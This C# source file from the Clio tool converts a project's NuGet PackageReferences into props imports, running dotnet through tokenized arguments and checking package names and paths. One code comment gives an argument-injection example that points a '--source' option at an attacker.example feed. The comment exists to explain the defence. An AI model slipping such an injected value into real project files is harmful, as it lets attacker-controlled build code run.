using System;
using System.Collections.Generic;
using System.Diagnostics.Contracts;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Xml.Linq;
using Clio.Project.NuGet;
using Clio.Workspaces;

namespace Clio.Common;

public interface INugetMaterializer
{

	#region Methods: Public

	public int Materialize(string packageName);

	#endregion

}

public class NugetMaterializer : INugetMaterializer
{

	#region Constants: Private

	private const string Tag = "PackageReference";
	private const string Net472Moniker = "net472";
	private const string NetStandardMoniker = "netstandard";
	private const string NetStandardTargetFramework = "netstandard2.0";
	private const string NugetHelperFolderName = ".nuget";

	//The Import attribute that names the props file this csproj pulls in.
	private const string ProjectAttribute = "Project";

	#endregion

	#region Fields: Private

	//The build output the helper project leaves behind, dropped before every conversion.
	private static readonly string[] StaleHelperOutputFolders = ["bin", "obj"];

	//NuGet's package-identifier grammar: dot-separated segments of letters, digits, underscores and hyphens.
	private static readonly Regex NugetPackageIdentifierPattern =
		new(@"^\w+([_.-]\w+)*$", RegexOptions.Compiled | RegexOptions.CultureInvariant);

	//NuGet's own ceiling for a package identifier.
	private const int MaximumNugetPackageIdentifierLength = 100;

	//Everything that could make a package name address a folder other than its own.
	private static readonly char[] PathSeparatorChars =
		[Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar, '/', '\\', ':'];

	private readonly IWorkspacePathBuilder _workspacePathBuilder;
	private readonly IFileSystem _fileSystem;
	private readonly ILogger _logger;
	private readonly IProcessExecutor _processExecutor;
	private readonly IPropsBuilder _propsBuilder;
	private string _csprojPath;
	private XDocument _csproj;

	#endregion

	#region Constructors: Public

	public NugetMaterializer(IWorkspacePathBuilder workspacePathBuilder, IFileSystem fileSystem,
		ILogger logger, IProcessExecutor processExecutor, IPropsBuilder propsBuilder){
		_workspacePathBuilder = workspacePathBuilder;
		_fileSystem = fileSystem;
		_logger = logger;
		_processExecutor = processExecutor;
		_propsBuilder = propsBuilder;
	}

	#endregion

	#region Methods: Private

	/// <summary>
	/// Adds PackageReference to the Nuget project
	/// </summary>
	/// <param name="packageName">Package to add to</param>
	/// <param name="xElements">Collection of NugetPackages to add</param>
	/// <returns>True when every package was added; false as soon as one <c>dotnet add</c> fails.</returns>
	private bool AddNugetReferences(string packageName, IEnumerable<XElement> xElements){
		IEnumerable<NugetPackage> refs = GetNugetReferences(xElements);
		foreach (NugetPackage nugetPackage in refs) {
			if (!IsNugetPackageIdentifier(nugetPackage.Name)) {
				_logger.WriteError($"The '{nugetPackage.Name}' PackageReference Include is not a NuGet package "
					+ $"identifier. No package reference was converted in the {packageName} package");
				return false;
			}
			if (RunInNugetProject(packageName, "add", "package", nugetPackage.Name, "-v",
				nugetPackage.Version.ToString())) {
				continue;
			}
			//Carrying on would build props out of the packages that did resolve, and the command
			//would report success for a conversion that silently dropped a dependency.
			_logger.WriteError($"Could not add the {nugetPackage.Name} package to the {packageName} "
				+ "helper project. No package reference was converted");
			return false;
		}
		return true;
	}

	/// <summary>
	/// Produces the following structure: <br/>
	/// ┗ 📂pkg1 <br/>
	/// ┃ ┣ 📂bin <br/>
	/// ┃ ┃ ┣ 📂net472 <br/>
	/// ┃ ┃ ┗ 📂netstandard <br/>
	/// ┃ ┣ 📂obj <br/>
	/// ┃ ┃ ┣ 📂Release <br/>
	/// </summary>
	/// <param name="packageName">Name of the package to build</param>
	/// <returns>True when <c>dotnet build</c> exited successfully.</returns>
	private bool BuildNugetProject(string packageName){
		if (RunInNugetProject(packageName, "build", $"{packageName}.csproj", "-c", "Release",
			"--no-incremental")) {
			return true;
		}
		//A failed build leaves whatever bin content the previous run produced, and reading that back
		//would describe the earlier run instead of this one.
		_logger.WriteError($"Could not build the {packageName} helper project. "
			+ "No package reference was converted");
		return false;
	}

	/// <summary>
	/// Runs a dotnet command inside the helper project folder and reports whether it succeeded.
	/// </summary>
	/// <remarks>
	/// <see cref="IProcessExecutor.Execute"/> hands back the captured text only, so a failed
	/// <c>dotnet add</c> or <c>dotnet build</c> was indistinguishable from a successful one and the
	/// command went on to publish props built from stale output.
	/// </remarks>
	private bool RunInNugetProject(string packageName, params string[] arguments){
		// Tokens, not one interpolated string: the package identifier and version come from the converted
		// project, and dotnet splits its own command line, so "Foo --source https://attacker.example/v3/index.json"
		// in a PackageReference Include would arrive as extra options and let a later restore pull and run
		// attacker-controlled build/buildTransitive targets. UseShellExecute = false does not prevent that.
		ProcessExecutionOptions options = new("dotnet", string.Empty) {
			ArgumentList = arguments,
			WorkingDirectory = BuildNugetProjectFolderPath(packageName)
		};
		ProcessExecutionResult result = _processExecutor.ExecuteAndCaptureAsync(options)
			.GetAwaiter().GetResult();
		if (result is {Started: true, ExitCode: 0}) {
			return true;
		}
		_logger.WriteError($"dotnet {string.Join(' ', arguments)} failed with exit code "
			+ $"{result?.ExitCode?.ToString() ?? "<none>"}");
		string output = JoinNonEmptyOutput(result?.StandardOutput, result?.StandardError);
		if (!string.IsNullOrWhiteSpace(output)) {
			_logger.WriteError(output);
		}
		return false;
	}

	private static string JoinNonEmptyOutput(string standardOutput, string standardError){
		string[] parts = new[] {standardOutput, standardError}
			.Where(part => !string.IsNullOrWhiteSpace(part))
			.ToArray();
		return string.Join(Environment.NewLine, parts);
	}

	private string BuildNugetProjectFolderPath(string packageName) =>
		Path.Combine(_workspacePathBuilder.RootPath, NugetHelperFolderName, packageName);

	/// <summary>
	/// Writes the helper project from the template and drops the output of the previous run.
	/// </summary>
	/// <remarks>
	/// The helper project is persistent and <see cref="AddNugetReferences"/> only ever adds, so a
	/// project left by an earlier run still declares the packages that run converted and still holds
	/// its bin/obj content. Reusing it made the props describe the earlier reference set: a
	/// dependency removed from the real csproj kept its DLL and its import. Recreating the project
	/// and clearing the output makes every run describe the references the csproj declares now.
	/// </remarks>
	private void CreateNugetProject(string packageName){
		string nugetProjectFolderPath = BuildNugetProjectFolderPath(packageName);
		_fileSystem.CreateDirectoryIfNotExists(nugetProjectFolderPath);

		string baseDir = AppDomain.CurrentDomain.BaseDirectory;
		string templatePath = Path.Combine(baseDir, "tpl", "NugetProject.csproj.tpl");
		string templateContent = _fileSystem.ReadAllText(templatePath);
		string nugetCsprojPath = Path.Combine(nugetProjectFolderPath, $"{packageName}.csproj");
		_fileSystem.WriteAllTextToFile(nugetCsprojPath, templateContent);

		foreach (string staleOutputFolder in StaleHelperOutputFolders) {
			_fileSystem.DeleteDirectoryIfExists(Path.Combine(nugetProjectFolderPath, staleOutputFolder));
		}
	}

	/// <summary>
	/// Rejects a package name that would steer path derivation out of the workspace packages folder.
	/// </summary>
	/// <remarks>
	/// The name arrives from the command line and reaches file reads, writes, builds and deletes -
	/// the props files, the csproj and its .bak, and the helper project. A rooted name, or one
	/// carrying a separator or a dot segment, resolves outside
	/// <see cref="IWorkspacePathBuilder.PackagesFolderPath"/>, so the check runs before the first
	/// filesystem call rather than inside each caller.
	/// </remarks>
	private bool IsPackageNameWithinPackagesFolder(string packageName){
		if (string.IsNullOrWhiteSpace(packageName)) {
			_logger.WriteError("The package name is empty");
			return false;
		}

		bool hasSeparator = packageName.IndexOfAny(PathSeparatorChars) >= 0;
		bool hasDotSegment = packageName is "." or ".."
			|| packageName.Split('.').Any(string.IsNullOrEmpty);
		if (hasSeparator || hasDotSegment || Path.IsPathRooted(packageName)
			|| packageName.IndexOfAny(Path.GetInvalidFileNameChars()) >= 0) {
			_logger.WriteError($"The {packageName} package name is not a plain package folder name");
			return false;
		}

		string packagesFolderPath = Path.GetFullPath(_workspacePathBuilder.PackagesFolderPath);
		string packagePath = Path.GetFullPath(_workspacePathBuilder.BuildPackagePath(packageName));
		string packagesFolderPrefix = packagesFolderPath
			.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar)
			+ Path.DirectorySeparatorChar;
		if (!packagePath.StartsWith(packagesFolderPrefix, StringComparison.OrdinalIgnoreCase)) {
			_logger.WriteError($"The {packageName} package resolves outside the "
				+ $"{packagesFolderPath} packages folder");
			return false;
		}
		return true;
	}

	/// <summary>
	/// Rejects a <c>PackageReference Include</c> value that is not a NuGet package identifier.
	/// </summary>
	/// <remarks>
	/// The value is written by whoever wrote the converted project, and it is handed to <c>dotnet add</c> and
	/// then to a restore. NuGet's own grammar for an identifier is dot-separated segments of letters, digits,
	/// underscores and hyphens, so anything carrying whitespace, a leading dash, or a path separator is not a
	/// package name and is refused before the process starts - tokenized arguments stop it from being read as
	/// an option, and this stops it from being sent at all.
	/// </remarks>
	private static bool IsNugetPackageIdentifier(string packageIdentifier) =>
		!string.IsNullOrWhiteSpace(packageIdentifier)
		&& packageIdentifier.Length <= MaximumNugetPackageIdentifierLength
		&& NugetPackageIdentifierPattern.IsMatch(packageIdentifier);

	[Pure]
	private IEnumerable<XElement> FindNugetReferences(string xmlContent){
		try {
			_csproj = XDocument.Parse(xmlContent);
			IEnumerable<XElement> elements = _csproj.Descendants(Tag);
			return elements;
		} catch {
			_logger.WriteError($"Could not parse {_csprojPath} file");
			return Array.Empty<XElement>();
		}
	}

	private static IEnumerable<NugetPackage> GetNugetReferences(IEnumerable<XElement> elements){
		IList<NugetPackage> list = new List<NugetPackage>();
		foreach (XElement element in elements) {
			string name = element.Attribute("Include")?.Value;
			string version = element.Attribute("Version")?.Value;
			if (!Version.TryParse(version, out Version parsedVersion)) {
				continue;
			}
			PackageVersion packageVersion = new(parsedVersion, string.Empty);
			NugetPackage item = new(name, packageVersion);
			list.Add(item);
		}
		return list;
	}

	private string GetXmlContent(string csprojPath){
		string csProjContent = _fileSystem.ReadAllText(csprojPath);
		if (string.IsNullOrEmpty(csProjContent)) {
			_logger.WriteError($"{csprojPath} file is empty");
		}
		return csProjContent;
	}

	private void UpdateCsProjFile(string packageName, IEnumerable<XElement> xElements, PropsBuildResult propsBuildResult){
		bool needsBackUp = false;
		
		//Comment out only the PackageReference elements that were actually materialized.
		//A nuget package that produced no dll (an analyzer, for instance) is still needed.
		foreach (XElement element in xElements) {
			string nugetPackageName = element.Attribute("Include")?.Value;
			if (!propsBuildResult.IsMaterialized(nugetPackageName)) {
				_logger.WriteWarning($"Keeping the {nugetPackageName} package reference in the "
					+ $"{_csprojPath} file, because it produced no assembly to reference");
				continue;
			}
			needsBackUp = true;
			XComment comment = new(element.ToString());
			element.ReplaceWith(comment);
		}
		
		//<Import Condition="'$(TargetFramework)' == 'net472'" Project="MrktApolloApp-net472.nuget.props" />
		needsBackUp |= AddPropsImport(packageName, Net472Moniker, propsBuildResult.Net472PropsCreated);
		
		//<Import Condition="'$(TargetFramework)' == 'netstandard2.0'" Project="MrktApolloApp-netstandard.nuget.props" />
		needsBackUp |= AddPropsImport(packageName, NetStandardMoniker, propsBuildResult.NetStandardPropsCreated);

		if (!needsBackUp) {
			return;
		}
		
		//A conversion snapshots the project as it is right now, replacing any earlier snapshot.
		SaveCsProjFile(true);
	}

	/// <summary>
	/// Backs up the csproj and writes the current document over it.
	/// Goes through IFileSystem so the written content is part of the testable contract.
	/// </summary>
	/// <param name="refreshBackup">
	/// True for a conversion: it snapshots the project exactly as it is now, because the caller is
	/// told to recover the state that preceded THIS run. A backup left by an earlier conversion
	/// stops describing that state as soon as the project is restored or edited in between, so
	/// keeping it would hand back stale dependencies and drop the intervening edits.
	/// False for the stale-import repair: it must keep the pre-conversion copy it repairs after,
	/// since copying the already-converted csproj over it destroys the only recovery copy.
	/// </param>
	private void SaveCsProjFile(bool refreshBackup){
		string backupPath = $"{_csprojPath}.bak";
		if (!refreshBackup && _fileSystem.ExistsFile(backupPath)) {
			_logger.WriteInfo($"Keeping the existing csproj backup file {backupPath}");
		} else {
			_logger.WriteInfo($"Creating csproj backup file {backupPath}");
			_fileSystem.CopyFile(_csprojPath, backupPath, true);
		}
		_fileSystem.WriteAllTextToFile(_csprojPath, BuildCsProjText());
	}

	/// <summary>
	/// Renders the document with a declaration that matches the bytes actually written.
	/// </summary>
	/// <remarks>
	/// <see cref="IFileSystem.WriteAllTextToFile"/> writes UTF-8 without a BOM. Copying the original
	/// declaration through unchanged therefore rewrote a UTF-16 project as UTF-8 bytes still claiming
	/// <c>encoding="utf-16"</c>, and reloading those bytes fails with "There is no Unicode byte order
	/// mark. Cannot switch to Unicode." Only the encoding is normalized; version and standalone are
	/// carried over, so a project that declared neither still gets neither.
	/// </remarks>
	private string BuildCsProjText(){
		if (_csproj.Declaration is null) {
			return _csproj.ToString();
		}
		XDeclaration declaration = new(
			_csproj.Declaration.Version, "utf-8", _csproj.Declaration.Standalone);
		return declaration + Environment.NewLine + _csproj;
	}

	/// <summary>
	/// Removes imports of props files that do not exist or are empty, and saves the csproj.
	/// A clio version before the empty-props fix could leave such an import behind, and MSBuild
	/// then fails the whole project with "Root element is missing" on every build.
	/// </summary>
	private void RepairUnusablePropsImports(string packageName){
		if (_csproj is null) {
			//The csproj is empty or could not be parsed; there is nothing to repair here
			return;
		}
		
		bool repaired = false;
		foreach (string moniker in new[] {Net472Moniker, NetStandardMoniker}) {
			string propsFileName = WorkspacePathBuilder.BuildPackagePropsFileName(packageName, moniker);
			string propsFilePath = _workspacePathBuilder.BuildPackagePropsPath(packageName, moniker);
			bool propsFileUsable = _fileSystem.ExistsFile(propsFilePath)
				&& !string.IsNullOrWhiteSpace(_fileSystem.ReadAllText(propsFilePath));
			if (propsFileUsable) {
				continue;
			}
			_fileSystem.DeleteFileIfExists(propsFilePath);
			repaired |= RemovePropsImport(propsFileName);
		}
		
		if (!repaired) {
			return;
		}
		
		//The repair runs after a conversion, so the pre-conversion snapshot must survive it.
		SaveCsProjFile(false);
	}

	/// <summary>
	/// Removes every Import element of the given props file from the csproj.
	/// </summary>
	/// <returns>True when the csproj was modified.</returns>
	private bool RemovePropsImport(string propsFileName){
		List<XElement> staleImports = _csproj.Descendants("Import")
			.Where(e => e.Attribute(ProjectAttribute)?.Value == propsFileName)
			.ToList();
		
		if (staleImports.Count == 0) {
			return false;
		}
		
		staleImports.ForEach(i => i.Remove());
		_logger.WriteInfo($"Removed the {propsFileName} import from the {_csprojPath} file, "
			+ "because the props file does not exist");
		return true;
	}

	/// <summary>
	/// Adds an Import element for the props file of the given moniker.
	/// An import is added only when the props file was actually written; importing
	/// a missing or empty props file makes MSBuild fail the whole project.
	/// </summary>
	/// <returns>True when the csproj was modified.</returns>
	private bool AddPropsImport(string packageName, string moniker, bool propsFileCreated){
		string propsFileName = WorkspacePathBuilder.BuildPackagePropsFileName(packageName, moniker);
		string targetFramework = moniker == Net472Moniker ? Net472Moniker : NetStandardTargetFramework;
		string condition = $"'$(TargetFramework)' == '{targetFramework}'";
		
		if (!propsFileCreated) {
			_logger.WriteWarning($"Skipping {propsFileName} import in the {_csprojPath} file, " +
				$"because the props file was not created");
			//An import left by an earlier run now points at a file that no longer exists,
			//and MSBuild fails the whole project on it.
			return RemovePropsImport(propsFileName);
		}
		
		bool importExists = _csproj.Descendants("Import")
			.Any(e => e.Attribute(ProjectAttribute)?.Value == propsFileName
				&& e.Attribute("Condition")?.Value == condition);
		
		if (importExists) {
			_logger.WriteInfo($"{propsFileName} import already exists in the {_csprojPath} file, skipping");
			return false;
		}
		
		XElement importElement = new("Import");
		importElement.SetAttributeValue("Condition", condition);
		importElement.SetAttributeValue(ProjectAttribute, propsFileName);
		
		//A csproj always has a root element, but the null-forgiving operator says nothing to a
		//reader and nullable warnings are off in this project, so report the broken file instead.
		XElement projectElement = _csproj.Root;
		if (projectElement is null) {
			_logger.WriteError($"Could not add the {propsFileName} import, because the "
				+ $"{_csprojPath} file has no root element");
			return false;
		}
		projectElement.Add(importElement);
		return true;
	}

	#endregion

	#region Methods: Public

	public int Materialize(string packageName){
		if (!IsPackageNameWithinPackagesFolder(packageName)) {
			return 1;
		}
		_csprojPath = _workspacePathBuilder.BuildPackageProjectPath(packageName);
		string xmlContent = GetXmlContent(_csprojPath);
		IEnumerable<XElement> elements = FindNugetReferences(xmlContent);
		IEnumerable<XElement> xElements = elements as XElement[] ?? elements.ToArray();
		if (!xElements.Any()) {
			_logger.WriteWarning($"Could not find any {Tag} references in the {_csprojPath} file");
			RepairUnusablePropsImports(packageName);
			return 1;
		}

		CreateNugetProject(packageName);
		if (!AddNugetReferences(packageName, xElements) || !BuildNugetProject(packageName)) {
			return 1;
		}
		PropsBuildResult propsBuildResult = _propsBuilder.Build(packageName);
		if (!propsBuildResult.HasAnyProps) {
			_logger.WriteError($"Could not find any dll to reference for {packageName}. "
				+ $"No package reference was converted");
			//Both props files are gone; an import left by an earlier run would now point at a
			//missing file and fail the whole project with MSB4019.
			RepairUnusablePropsImports(packageName);
			return 1;
		}
		UpdateCsProjFile(packageName, xElements, propsBuildResult);
		return 0;
	}

	#endregion

}